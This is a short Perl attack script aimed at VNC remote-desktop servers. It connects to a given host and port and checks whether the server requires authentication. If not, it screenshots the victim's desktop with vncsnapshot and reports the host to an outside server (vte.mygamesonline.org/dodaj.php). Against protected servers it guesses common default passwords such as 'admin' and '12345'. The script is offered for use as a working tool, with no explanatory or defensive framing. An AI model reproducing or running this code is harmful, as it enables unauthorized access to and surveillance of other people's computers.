#!/usr/bin/perl -w
#
 my ($vte);
use strict;
use IO::Socket::INET;
 
my ($data, $security) = undef;
my ($hostname, $port) = @ARGV;
 
$SIG{ALRM} = sub {
	die "[$hostname:$port] Timed out.\n";
};
 
warn "[$hostname:$port] Trying to connect and snapshot.\n";
 
my $client = new IO::Socket::INET(
		PeerHost => $hostname,
		PeerPort => $port,
		Proto => "tcp",
		Timeout => 40
	) or die "[$hostname:$port] Unable to connect: $!.\n";
 
alarm(30);
$client->recv($data, 512);
if ($data =~ /^RFB .*/) {
	$client->send("RFB 003.003\n");
} else {
	die "[$hostname:$port] Unexpected response when negotiating.\n";
}
 
alarm(30);
$client->recv($data, 512);
if (unpack("H*", $data) =~ /00000001/) {
	$security = 0;
}
 
$client->close();
 use MIME::Base64;
 my $spierdalaj = encode_base64("xvncviewer $hostname:$port", '');
 my $ne = 'http://vte.mygamesonline.org/dodaj.php?p=vnc&link='.$spierdalaj.'&dork=nie';
alarm(120);
if (defined($security)) {
	warn "[$hostname:$port] Taking snapshot.\n";
	system("vncsnapshot -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
	qx!echo $hostname:$port >> qvncp!;
	   qx!GET "$ne"!;
} else {
qx!echo $hostname:$port >> qvncDE!;
	warn "[$hostname:$port] Password required - ignoring.\n";
	system("echo 'admin' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
	system("echo '1' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
	system("echo '12345' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
	system("echo 'vnc123' | vncsnapshot -autopass -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
}
